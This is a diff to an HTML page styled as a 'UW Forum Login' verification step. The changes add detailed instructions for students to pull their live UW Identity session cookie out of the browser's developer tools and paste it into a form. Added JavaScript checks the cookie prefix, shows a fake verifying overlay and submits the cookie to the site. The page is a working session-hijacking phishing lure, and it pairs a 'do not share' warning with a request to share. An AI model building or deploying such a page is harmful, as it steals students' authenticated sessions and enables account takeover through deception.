@@ -1,12 +1,65 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>UW Verify</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>UW Forum Login</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
 <body>
-  <h1>UW Student Verification</h1>
-  <form action="/verify" method="post">
-    <label>Your UW session cookie:</label><br>
-    <textarea name="cookie" rows="4" cols="60" required></textarea><br>
-    <button type="submit">Verify me</button>
-  </form>
+  <div id="content">
+    <h1>Verify your identity with your personal UW cookie</h1>
+    <p>
+      To find your cookie:
+    </p>
+    <ul>
+      <li>Log in to <a href="https://identity.uw.edu" target="_blank">UW Identity</a>.</li>
+      <li>Append <code>/api/profile</code> to the URL and press Enter.</li>
+      <li>Open your browser’s developer tools and go to the Network tab.</li>
+      <li>Refresh the page and locate the <code>identityuwsession=…</code> cookie inside profile/.</li>
+      <li>Copy the full cookie value and paste it below.</li>
+    </ul>
+    <p>
+      <strong>Note:</strong> This cookie is sensitive information. Do not share it with anyone.
+      It is used to verify your identity and grant access to the UW Forum.
+    </p>
+
+    <div id="errorMessage" class="error"></div>
+
+    <form id="verifyForm" action="/verify" method="POST">
+      <textarea name="cookie" rows="4" cols="60"
+        placeholder="Paste your identityuwsession=… cookie here"></textarea><br>
+      <button type="submit">Verify &amp; Enter Forum →</button>
+    </form>
+  </div>
+
+  <div id="loadingOverlay">
+    <div id="loadingMessage">
+      <p>Verifying… this may take up to 2 minutes.</p>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('verifyForm');
+    const errDiv = document.getElementById('errorMessage');
+    const overlay = document.getElementById('loadingOverlay');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const cookie = form.cookie.value.trim();
+
+      // basic validation: nonempty and starts with the expected prefix
+      if (!cookie || !cookie.startsWith('identityuwsession=')) {
+        errDiv.textContent = 'Please paste a valid UW cookie starting with “identityuwsession=”.';
+        return;
+      }
+
+      // clear any previous error and show the overlay
+      errDiv.textContent = '';
+      overlay.style.display = 'flex';
+
+      // finally submit
+      form.submit();
+    });
+  </script>
 </body>
 </html>
